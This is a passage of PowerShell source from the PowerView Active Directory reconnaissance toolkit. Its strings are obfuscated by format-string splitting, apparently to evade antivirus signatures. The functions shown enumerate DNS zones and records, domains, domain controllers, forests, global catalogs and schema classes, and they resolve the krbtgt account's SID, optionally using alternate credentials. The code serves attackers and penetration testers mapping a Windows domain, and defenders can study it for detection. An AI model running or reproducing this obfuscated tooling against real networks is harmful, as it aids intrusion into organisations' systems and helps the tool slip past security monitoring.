            $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
        }
        else {
            
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
        }

        $Searcher.PageSize = $ResultPageSize
        $Searcher.SearchScope = $SearchScope
        $Searcher.CacheResults = $False
        $Searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All

        if ($PSBoundParameters[("{0}{4}{1}{2}{3}" -f 'Se','v','erTimeLi','mit','r')]) {
            $Searcher.ServerTimeLimit = $ServerTimeLimit
        }

        if ($PSBoundParameters[("{2}{1}{0}"-f'e','mbston','To')]) {
            $Searcher.Tombstone = $True
        }

        if ($PSBoundParameters[("{1}{3}{0}{2}" -f 'Fil','LDA','ter','P')]) {
            $Searcher.filter = $LDAPFilter
        }

        if ($PSBoundParameters[("{3}{0}{1}{2}" -f 'uri','ty','Masks','Sec')]) {
            $Searcher.SecurityMasks = Switch ($SecurityMasks) {
                ("{0}{1}"-f 'Dac','l') { [System.DirectoryServices.SecurityMasks]::Dacl }
                ("{0}{1}"-f 'Grou','p') { [System.DirectoryServices.SecurityMasks]::Group }
                ("{0}{1}"-f'Non','e') { [System.DirectoryServices.SecurityMasks]::None }
                ("{1}{0}" -f 'er','Own') { [System.DirectoryServices.SecurityMasks]::Owner }
                ("{0}{1}" -f 'Sa','cl') { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }

        if ($PSBoundParameters[("{0}{1}{2}" -f 'Pr','o','perties')]) {
            
            $PropertiesToLoad = $Properties| ForEach-Object { $_.Split(',') }
            $Null = $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))
        }

        $Searcher
    }
}


function Convert-DNSRecord {


    [OutputType({"{5}{7}{1}{3}{2}{6}{0}{4}" -f'stom','s','ent.Au','tem.Managem','Object','S','tomation.PSCu','y'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $DNSRecord
    )

    BEGIN {
        function Get-Name {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{5}{4}{3}{0}{1}{2}"-f 'r','ect','ly','ypeCor','SUseOutputT','P'}, '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )

            [Int]$Length = $Raw[0]
            [Int]$Segments = $Raw[1]
            [Int]$Index =  2
            [String]$Name  = ''

            while ($Segments-- -gt 0)
            {
                [Int]$SegmentLength = $Raw[$Index++]
                while ($SegmentLength-- -gt 0) {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += "."
            }
            $Name
        }
    }

    PROCESS {
        
        $RDataType = [BitConverter]::ToUInt16($DNSRecord, 2)
        $UpdatedAtSerial = [BitConverter]::ToUInt32($DNSRecord, 8)

        $TTLRaw = $DNSRecord[12..15]

        
        $Null = [array]::Reverse($TTLRaw)
        $TTL = [BitConverter]::ToUInt32($TTLRaw, 0)

        $Age = [BitConverter]::ToUInt32($DNSRecord, 20)
        if ($Age -ne 0) {
            $TimeStamp = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
        }
        else {
            $TimeStamp = ("{1}{2}{0}"-f 'c]','[','stati')
        }

        $DNSRecordObject = New-Object PSObject

        if ($RDataType -eq 1) {
            $IP = "{0}.{1}.{2}.{3}" -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
            $Data = $IP
            $DNSRecordObject | Add-Member Noteproperty ("{2}{0}{3}{1}"-f 'ec','Type','R','ord') 'A'
        }

        elseif ($RDataType -eq 2) {
            $NSName = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $NSName
            $DNSRecordObject | Add-Member Noteproperty ("{1}{2}{0}" -f 'e','RecordTy','p') 'NS'
        }

        elseif ($RDataType -eq 5) {
            $Alias = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $Alias
            $DNSRecordObject | Add-Member Noteproperty ("{0}{2}{1}"-f'R','e','ecordTyp') ("{0}{1}"-f'CNAM','E')
        }

        elseif ($RDataType -eq 6) {
            
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty ("{0}{1}{2}"-f'R','ecor','dType') 'SOA'
        }

        elseif ($RDataType -eq 12) {
            $Ptr = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $Ptr
            $DNSRecordObject | Add-Member Noteproperty ("{2}{0}{1}" -f'or','dType','Rec') 'PTR'
        }

        elseif ($RDataType -eq 13) {
            
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty ("{2}{1}{3}{0}" -f'Type','ec','R','ord') ("{0}{1}"-f'HINF','O')
        }

        elseif ($RDataType -eq 15) {
            
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty ("{2}{0}{1}"-f'ordTy','pe','Rec') 'MX'
        }

        elseif ($RDataType -eq 16) {
            [string]$TXT  = ''
            [int]$SegmentLength = $DNSRecord[24]
            $Index = 25

            while ($SegmentLength-- -gt 0) {
                $TXT += [char]$DNSRecord[$index++]
            }

            $Data = $TXT
            $DNSRecordObject | Add-Member Noteproperty ("{0}{1}{2}" -f'R','ec','ordType') 'TXT'
        }

        elseif ($RDataType -eq 28) {
            
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty ("{2}{1}{0}"-f 'pe','cordTy','Re') ("{0}{1}" -f'A','AAA')
        }

        elseif ($RDataType -eq 33) {
            
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty ("{2}{1}{0}"-f'e','rdTyp','Reco') 'SRV'
        }

        else {
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty ("{1}{2}{0}" -f 'dType','Rec','or') ("{2}{0}{1}" -f 'W','N','UNKNO')
        }

        $DNSRecordObject | Add-Member Noteproperty ("{3}{2}{0}{1}" -f'te','dAtSerial','da','Up') $UpdatedAtSerial
        $DNSRecordObject | Add-Member Noteproperty 'TTL' $TTL
        $DNSRecordObject | Add-Member Noteproperty 'Age' $Age
        $DNSRecordObject | Add-Member Noteproperty ("{2}{0}{1}" -f 'ta','mp','TimeS') $TimeStamp
        $DNSRecordObject | Add-Member Noteproperty ("{0}{1}" -f'Da','ta') $Data
        $DNSRecordObject
    }
}


function Get-DomainDNSZone {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{0}{1}" -f'houl','dProcess','S','PS'}, '')]
    [OutputType({"{1}{4}{5}{2}{0}{3}" -f'n','Powe','NSZo','e','r','View.D'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{3}{4}{1}{2}"-f 'Doma','l','er','inC','ontrol'})]
        [String]
        $Server,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Alias({"{1}{3}{2}{0}"-f'ne','Ret','rnO','u'})]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $SearcherArguments = @{
            ("{2}{1}{0}" -f 'lter','DAPFi','L') = (("{6}{0}{4}{1}{2}{3}{5}"-f 'object','=d','nsZ','on','Class','e)','('))
        }
        if ($PSBoundParameters[("{1}{0}"-f 'in','Doma')]) { $SearcherArguments[("{1}{0}"-f 'in','Doma')] = $Domain }
        if ($PSBoundParameters[("{0}{1}" -f 'S','erver')]) { $SearcherArguments[("{1}{0}" -f 'rver','Se')] = $Server }
        if ($PSBoundParameters[("{2}{0}{1}" -f 'roper','ties','P')]) { $SearcherArguments[("{2}{0}{1}" -f'rtie','s','Prope')] = $Properties }
        if ($PSBoundParameters[("{3}{0}{1}{2}"-f's','ult','PageSize','Re')]) { $SearcherArguments[("{2}{3}{1}{0}" -f'e','z','Resul','tPageSi')] = $ResultPageSize }
        if ($PSBoundParameters[("{2}{3}{4}{0}{1}"-f 'eLi','mit','S','erve','rTim')]) { $SearcherArguments[("{2}{1}{0}" -f 'Limit','e','ServerTim')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{1}{3}{0}{2}" -f 'n','Cred','tial','e')]) { $SearcherArguments[("{3}{0}{1}{2}" -f'rede','n','tial','C')] = $Credential }
        $DNSSearcher1 = Get-DomainSearcher @SearcherArguments

        if ($DNSSearcher1) {
            if ($PSBoundParameters[("{1}{0}" -f 'One','Find')]) { $Results = $DNSSearcher1.FindOne()  }
            else { $Results = $DNSSearcher1.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                $Out = Convert-LDAPProperty -Properties $_.Properties
                $Out | Add-Member NoteProperty ("{1}{0}{2}"-f'am','ZoneN','e') $Out.name
                $Out.PSObject.TypeNames.Insert(0, ("{4}{1}{3}{2}{0}" -f'ne','ower','w.DNSZo','Vie','P'))
                $Out
            }

            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose ('[G'+'et'+'-Do'+'ma'+'in'+'DFSShare'+'] '+'E'+'rror '+'di'+'spos'+'ing'+' '+'o'+'f '+'t'+'he '+'Result'+'s'+' '+'objec'+'t'+': '+"$_")
                }
            }
            $DNSSearcher1.dispose()
        }

        $SearcherArguments[("{0}{2}{4}{3}{1}"-f'SearchBase','x','Pr','i','ef')] = ("{3}{5}{7}{0}{2}{4}{1}{6}" -f'osoftD','mainDns','NS,DC=','CN=M','Do','ic','Zones','r')
        $DNSSearcher2 = Get-DomainSearcher @SearcherArguments

        if ($DNSSearcher2) {
            try {
                if ($PSBoundParameters[("{2}{0}{1}"-f 'ndO','ne','Fi')]) { $Results = $DNSSearcher2.FindOne() }
                else { $Results = $DNSSearcher2.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    $Out = Convert-LDAPProperty -Properties $_.Properties
                    $Out | Add-Member NoteProperty ("{0}{2}{1}"-f 'Z','eName','on') $Out.name
                    $Out.PSObject.TypeNames.Insert(0, ("{0}{4}{2}{3}{1}"-f 'Po','Zone','ew.D','NS','werVi'))
                    $Out
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose ('[Get-D'+'oma'+'i'+'nDNSZone'+']'+' '+'Error'+' '+'dispo'+'sin'+'g '+'of'+' '+'t'+'he '+'R'+'esults '+'ob'+'ject: '+"$_")
                    }
                }
            }
            catch {
                Write-Verbose ((("{7}{3}{1}{0}{8}{6}{10}{5}{4}{12}{2}{9}{11}" -f 'one] Error a','nDNSZ','=DomainDns','i','crosoftDN','iCN=Mi','cessing B','[Get-Doma','c','Zo','w','nesBwi','S,DC')) -cREpLace  'Bwi',[cHAR]39)
            }
            $DNSSearcher2.dispose()
        }
    }
}


function Get-DomainDNSRecord {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{4}{1}{2}"-f'PSSho','ces','s','u','ldPro'}, '')]
    [OutputType({"{1}{3}{0}{2}{4}"-f'.D','PowerVie','NSRe','w','cord'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ZoneName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{3}{1}" -f'Domain','r','Con','trolle'})]
        [String]
        $Server,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties = ("{9}{3}{5}{4}{7}{13}{10}{14}{1}{12}{0}{8}{11}{15}{2}{6}" -f 'cr','wh','e','ame','ingui',',dist','d','shedname','eated,','n','sre','whenc','en',',dn','cord,','hang'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Alias({"{1}{0}{2}" -f 'et','R','urnOne'})]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $SearcherArguments = @{
            ("{2}{1}{0}"-f 'ter','Fil','LDAP') = ("{1}{4}{3}{0}{2}"-f '=d','(o','nsNode)','tClass','bjec')
            ("{0}{1}{3}{2}" -f 'S','earchBasePref','x','i') = "DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if ($PSBoundParameters[("{1}{0}"-f'main','Do')]) { $SearcherArguments[("{0}{1}"-f'Domai','n')] = $Domain }
        if ($PSBoundParameters[("{0}{1}" -f 'Serve','r')]) { $SearcherArguments[("{1}{0}{2}" -f 've','Ser','r')] = $Server }
        if ($PSBoundParameters[("{1}{0}{2}"-f'rt','Prope','ies')]) { $SearcherArguments[("{2}{0}{1}{3}" -f'opert','i','Pr','es')] = $Properties }
        if ($PSBoundParameters[("{3}{1}{2}{0}{4}"-f 'g','esultP','a','R','eSize')]) { $SearcherArguments[("{1}{2}{0}" -f 'tPageSize','Resu','l')] = $ResultPageSize }
        if ($PSBoundParameters[("{1}{2}{0}{3}" -f 'eLimi','Se','rverTim','t')]) { $SearcherArguments[("{4}{0}{3}{2}{1}"-f'e','mit','TimeLi','r','Serv')] = $ServerTimeLimit }
        if ($PSBoundParameters[("{3}{0}{1}{2}"-f 'de','nt','ial','Cre')]) { $SearcherArguments[("{0}{2}{1}{3}" -f'Crede','t','n','ial')] = $Credential }
        $DNSSearcher = Get-DomainSearcher @SearcherArguments

        if ($DNSSearcher) {
            if ($PSBoundParameters[("{0}{1}"-f'FindOn','e')]) { $Results = $DNSSearcher.FindOne() }
            else { $Results = $DNSSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                try {
                    $Out = Convert-LDAPProperty -Properties $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                    $Out | Add-Member NoteProperty ("{0}{2}{1}"-f 'Zone','me','Na') $ZoneName

                    
                    if ($Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        
                        $Record = Convert-DNSRecord -DNSRecord $Out.dnsrecord[0]
                    }
                    else {
                        $Record = Convert-DNSRecord -DNSRecord $Out.dnsrecord
                    }

                    if ($Record) {
                        $Record.PSObject.Properties | ForEach-Object {
                            $Out | Add-Member NoteProperty $_.Name $_.Value
                        }
                    }

                    $Out.PSObject.TypeNames.Insert(0, ("{0}{4}{5}{3}{2}{1}" -f'Power','cord','e','DNSR','V','iew.'))
                    $Out
                }
                catch {
                    Write-Warning ('[Get-Domain'+'DNSR'+'e'+'c'+'ord'+'] '+'E'+'rro'+'r: '+"$_")
                    $Out
                }
            }

            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose ('[Ge'+'t-Domain'+'DNS'+'Rec'+'ord'+']'+' '+'Err'+'or'+' '+'d'+'i'+'s'+'posing '+'o'+'f '+'the'+' '+'R'+'esults'+' '+'obje'+'ct:'+' '+"$_")
                }
            }
            $DNSSearcher.dispose()
        }
    }
}


function Get-Domain {


    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters[("{0}{2}{1}" -f'C','edential','r')]) {

            Write-Verbose ("{12}{6}{13}{11}{3}{4}{5}{1}{7}{0}{9}{10}{8}{2}"-f'ls for ','e cre','in',' Using ','alte','rnat','-Do','dentia','ma','Get','-Do','n]','[Get','mai')

            if ($PSBoundParameters[("{1}{0}" -f 'omain','D')]) {
                $TargetDomain = $Domain
            }
            else {
                
                $TargetDomain = $Credential.GetNetworkCredential().Domain
                Write-Verbose ('['+'Get-Do'+'mai'+'n] '+'E'+'xtrac'+'ted '+'doma'+'in'+' '+"'$TargetDomain' "+'from'+' '+'-C'+'re'+'dentia'+'l')
            }

            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(("{1}{0}"-f'n','Domai'), $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)

            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Verbose ('[Get-'+'Doma'+'in'+'] '+'The'+' '+'specifi'+'e'+'d '+'doma'+'i'+'n '+"'$TargetDomain' "+'d'+'oes '+'not'+' '+'exist'+', '+'c'+'ould'+' '+'n'+'ot '+'be'+' '+'contac'+'ted'+', '+'the'+'re'+' '+(('i'+'snBL'+'vt ')  -RepLacE 'BLv',[CHar]39)+'an'+' '+'existing'+' '+'t'+'rus'+'t, '+'o'+'r '+'the'+' '+'specif'+'i'+'ed '+'cre'+'den'+'tia'+'ls '+'ar'+'e '+'inva'+'lid:'+' '+"$_")
            }
        }
        elseif ($PSBoundParameters[("{1}{0}"-f 'n','Domai')]) {
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(("{0}{1}"-f'Do','main'), $Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Verbose ('[Ge'+'t-Domain'+'] '+'The'+' '+'s'+'pe'+'cifie'+'d '+'dom'+'ain '+"'$Domain' "+'do'+'es '+'no'+'t '+'ex'+'ist,'+' '+'c'+'ould'+' '+'n'+'ot '+'b'+'e '+'c'+'ont'+'act'+'ed, '+'o'+'r '+'the'+'re'+' '+(('isn'+'hN'+'xt ')  -RePLacE 'hNx',[ChaR]39)+'a'+'n '+'existi'+'n'+'g '+'tr'+'us'+'t '+': '+"$_")
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose ('['+'Get-'+'Domain] '+'Er'+'ror '+'retr'+'ie'+'ving'+' '+'the'+' '+'cur'+'rent '+'do'+'main:'+' '+"$_")
            }
        }
    }
}


function Get-DomainController {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{0}{2}"-f'roc','P','ess','PSShould'}, '')]
    [OutputType({"{1}{2}{0}{3}" -f'ew.Com','Po','werVi','puter'})]
    [OutputType({"{9}{10}{2}{4}{6}{0}{7}{1}{3}{5}{8}" -f 'ices.ActiveDirecto','.DomainCon','D','troll','ir','e','ectoryServ','ry','r','Syst','em.'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{2}{1}" -f'in','roller','Cont','Doma'})]
        [String]
        $Server,

        [Switch]
        $LDAP,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters[("{2}{1}{0}"-f 'n','ai','Dom')]) { $Arguments[("{0}{1}"-f'Do','main')] = $Domain }
        if ($PSBoundParameters[("{2}{0}{1}"-f 'de','ntial','Cre')]) { $Arguments[("{2}{1}{0}" -f 'al','enti','Cred')] = $Credential }

        if ($PSBoundParameters[("{0}{1}" -f 'LD','AP')] -or $PSBoundParameters[("{1}{0}"-f'rver','Se')]) {
            if ($PSBoundParameters[("{1}{0}"-f 'er','Serv')]) { $Arguments[("{2}{0}{1}" -f 'erv','er','S')] = $Server }

            
            $Arguments[("{3}{2}{0}{1}"-f 'PF','ilter','A','LD')] = (("{6}{3}{8}{4}{0}{7}{1}{5}{2}"-f 'ountControl:1.2.840.1',':=','192)','er','c','8','(us','13556.1.4.803','Ac'))

            Get-DomainComputer @Arguments
        }
        else {
            $FoundDomain = Get-Domain @Arguments
            if ($FoundDomain) {
                $FoundDomain.DomainControllers
            }
        }
    }
}


function Get-Forest {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{4}{0}{3}{1}"-f 'o','ldProcess','PS','u','Sh'}, '')]
    [OutputType({"{2}{5}{6}{3}{11}{7}{10}{4}{8}{1}{9}{0}" -f 'ct','omObj','Syste','ment.A','PS','m.Mana','ge','t','Cust','e','ion.','utoma'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters[("{1}{2}{0}" -f'dential','Cr','e')]) {

            Write-Verbose ("{1}{13}{4}{7}{3}{14}{12}{5}{8}{0}{15}{10}{9}{6}{11}{2}" -f 'ia','[G','est','t]','t-Fore','e','Get-Fo','s','nt','or ',' f','r','ed','e',' Using alternate cr','ls')

            if ($PSBoundParameters[("{1}{0}" -f 'rest','Fo')]) {
                $TargetForest = $Forest
            }
            else {
                
                $TargetForest = $Credential.GetNetworkCredential().Domain
                Write-Verbose ('[G'+'et-'+'Forest]'+' '+'Ext'+'ract'+'ed '+'do'+'m'+'ain '+"'$Forest' "+'from'+' '+'-Creden'+'ti'+'al')
            }

            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(("{1}{0}" -f't','Fores'), $TargetForest, $Credential.UserName, $Credential.GetNetworkCredential().Password)

            try {
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            catch {
                Write-Verbose ('[Ge'+'t'+'-Forest] '+'Th'+'e '+'spe'+'ci'+'fied '+'for'+'est '+"'$TargetForest' "+'d'+'oes '+'n'+'ot '+'exist'+','+' '+'c'+'ould '+'no'+'t '+'be'+' '+'co'+'n'+'tac'+'ted, '+'the'+'re '+(('isnZf8'+'t ')-RepLaCE  ([cHAr]90+[cHAr]102+[cHAr]56),[cHAr]39)+'an'+' '+'exis'+'ti'+'ng '+'tru'+'st, '+'o'+'r '+'t'+'he '+'s'+'pec'+'ifi'+'ed '+'credenti'+'als'+' '+'ar'+'e '+'inva'+'l'+'id: '+"$_")
                $Null
            }
        }
        elseif ($PSBoundParameters[("{1}{2}{0}" -f 't','Fo','res')]) {
            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(("{1}{0}"-f 'rest','Fo'), $Forest)
            try {
                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            catch {
                Write-Verbose ('[Get'+'-'+'Fo'+'rest] '+'T'+'he '+'s'+'p'+'ec'+'ified '+'fore'+'s'+'t '+"'$Forest' "+'d'+'oes '+'no'+'t '+'exi'+'st, '+'could'+' '+'n'+'ot '+'b'+'e '+'contacted'+','+' '+'o'+'r '+'th'+'er'+'e '+('is'+'nXY4t'+' ').rEPLace('XY4',[strinG][cHaR]39)+'an'+' '+'exis'+'ting '+'trus'+'t'+': '+"$_")
                return $Null
            }
        }
        else {
            
            $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }

        if ($ForestObject) {
            
            if ($PSBoundParameters[("{2}{0}{1}" -f 'dentia','l','Cre')]) {
                $ForestSid = (Get-DomainUser -Identity ("{0}{1}" -f 'k','rbtgt') -Domain $ForestObject.RootDomain.Name -Credential $Credential).objectsid
            }
            else {
                $ForestSid = (Get-DomainUser -Identity ("{0}{1}" -f 'kr','btgt') -Domain $ForestObject.RootDomain.Name).objectsid
            }

            $Parts = $ForestSid -Split '-'
            $ForestSid = $Parts[0..$($Parts.length-2)] -join '-'
            $ForestObject | Add-Member NoteProperty ("{2}{4}{0}{3}{1}"-f'a','nSid','RootD','i','om') $ForestSid
            $ForestObject
        }
    }
}


function Get-ForestDomain {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{3}{4}{1}"-f 'houl','cess','PSS','dPr','o'}, '')]
    [OutputType({"{10}{8}{5}{0}{4}{7}{3}{9}{2}{6}{1}" -f 'tor','n','or','ces.ActiveDir','yServ','Direc','y.Domai','i','em.','ect','Syst'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters[("{1}{0}"-f 'rest','Fo')]) { $Arguments[("{0}{1}{2}" -f'F','ore','st')] = $Forest }
        if ($PSBoundParameters[("{0}{2}{1}" -f'Cre','tial','den')]) { $Arguments[("{0}{3}{2}{1}"-f 'Cred','al','ti','en')] = $Credential }

        $ForestObject = Get-Forest @Arguments
        if ($ForestObject) {
            $ForestObject.Domains
        }
    }
}


function Get-ForestGlobalCatalog {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{0}"-f 'rocess','ldP','PSShou'}, '')]
    [OutputType({"{3}{5}{14}{12}{4}{10}{7}{9}{0}{6}{8}{1}{11}{13}{2}" -f 'o','balCat','g','S','c','ystem.Dir','r','tiveD','y.Glo','irect','es.Ac','a','i','lo','ectoryServ'})]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters[("{1}{0}"-f'rest','Fo')]) { $Arguments[("{0}{1}" -f'F','orest')] = $Forest }
        if ($PSBoundParameters[("{0}{3}{2}{1}"-f'C','tial','en','red')]) { $Arguments[("{2}{0}{1}" -f 'r','edential','C')] = $Credential }

        $ForestObject = Get-Forest @Arguments

        if ($ForestObject) {
            $ForestObject.FindAllGlobalCatalogs()
        }
    }
}


function Get-ForestSchemaClass {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{0}{3}{1}{2}"-f 'uldP','es','s','roc','PSSho'}, '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Alias({"{1}{0}" -f'lass','C'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ClassName,

        [Alias({"{1}{0}"-f'ame','N'})]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $Arguments = @{}
        if ($PSBoundParameters[("{0}{1}" -f 'Fo','rest')]) { $Arguments[("{0}{1}"-f 'Fo','rest')] = $Forest }
        if ($PSBoundParameters[("{1}{2}{0}"-f'ial','Creden','t')]) { $Arguments[("{2}{0}{1}{3}"-f 'de','ntia','Cre','l')] = $Credential }

        $ForestObject = Get-Forest @Arguments

        if ($ForestObject) {
            if ($PSBoundParameters[("{2}{1}{0}" -f'ame','N','Class')]) {
                ForEach ($TargetClass in $ClassName) {
                    $ForestObject.Schema.FindClass($TargetClass)
                }
            }
            else {
                $ForestObject.Schema.FindAllClasses()
            }
        }
    }
}


function Find-DomainObjectPropertyOutlier {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{2}{3}{4}" -f'Sh','PS','ouldPro','c','ess'}, '')]
    [OutputType({"{2}{3}{5}{1}{0}{4}"-f 'l','tyOut','PowerView.','Prope','ier','r'})]
    [CmdletBinding(DefaultParameterSetName = {"{1}{3}{0}{2}" -f'm','Cl','e','assNa'})]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = "C`las`s`NamE")]
        [Alias({"{1}{0}" -f 's','Clas'})]
        [ValidateSet({"{0}{1}" -f'U','ser'}, {"{1}{0}"-f'oup','Gr'}, {"{2}{1}{0}" -f 'ter','pu','Com'})]
        [String]
        $ClassName,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $ReferencePropertySet,

        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = "ReFer`eNCE`o`BJeCt")]
        [PSCustomObject]
        $ReferenceObject,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'r','Filte'})]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'ADSPa','th'})]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{5}{0}{2}{1}{4}{3}"-f 'i','C','n','ntroller','o','Doma'})]
        [String]
        $Server,

        [ValidateSet({"{1}{0}"-f'se','Ba'}, {"{0}{1}"-f'OneLev','el'}, {"{0}{1}" -f 'Su','btree'})]
        [String]
        $SearchScope = ("{0}{1}" -f'Su','btree'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
